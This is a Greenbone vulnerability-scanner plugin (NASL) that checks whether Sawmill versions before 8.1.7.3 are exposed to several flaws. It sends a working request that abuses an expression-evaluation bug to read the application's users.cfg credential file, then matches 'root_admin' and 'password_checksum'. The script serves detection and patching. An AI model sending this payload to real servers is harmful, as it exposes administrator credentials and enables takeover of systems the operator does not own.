# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:sawmill:sawmill";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100866");
  script_version("2025-03-21T05:38:29+0000");
  script_tag(name:"last_modification", value:"2025-03-21 05:38:29 +0000 (Fri, 21 Mar 2025)");
  script_tag(name:"creation_date", value:"2010-10-22 14:10:21 +0200 (Fri, 22 Oct 2010)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("Sawmill Multiple Security Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44292");
  script_xref(name:"URL", value:"https://www.sec-consult.com/files/20101021-0_sawmill_multiple_critical_vulns.txt");
  script_xref(name:"URL", value:"http://www.sawmill.net");
  script_xref(name:"URL", value:"http://www.sawmill.net/version_history8.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/514405");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_sawmill_detect.nasl");
  script_require_ports("Services/www", 8988);
  script_mandatory_keys("sawmill/installed");

  script_tag(name:"solution", value:"Updates are available. Please see the references for details.");

  script_tag(name:"summary", value:"Sawmill is prone to multiple security vulnerabilities, including unauthorized-
  access, security-bypass, and cross-site-scripting issues.");

  script_tag(name:"impact", value:"Attackers can exploit these issues to gain administrative access to
  the affected application, execute arbitrary commands, perform unauthorized actions, and steal
  cookie-based authentication credentials. Other attacks are also possible.");

  script_tag(name:"affected", value:"Versions prior to Sawmill 8.1.7.3 are vulnerable.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/?a=ee&exp=error(read_file(%27LogAnalysisInfo/users.cfg%27))";

if( http_vuln_check( port:port, url:url, pattern:"root_admin", extra_check:make_list( "password_checksum", "users", "username" ) ) ) {
  report = http_report_vuln_url( url:url, port:port );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
